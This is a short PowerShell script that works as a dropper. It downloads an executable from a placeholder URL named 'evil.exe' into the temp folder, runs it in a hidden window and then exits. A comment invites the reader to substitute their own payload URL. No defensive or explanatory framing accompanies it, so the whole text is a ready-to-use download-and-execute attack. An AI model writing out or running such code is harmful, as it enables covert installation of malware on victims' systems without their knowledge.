# Download and execute remote payload from URL (replace with your own)
Invoke-WebRequest -Uri "https://example.com/evil.exe" -OutFile "$env:TEMP\payload.exe"
Start-Process "$env:TEMP\payload.exe" -WindowStyle Hidden

# Exit the current script to hide it from processes list
exit
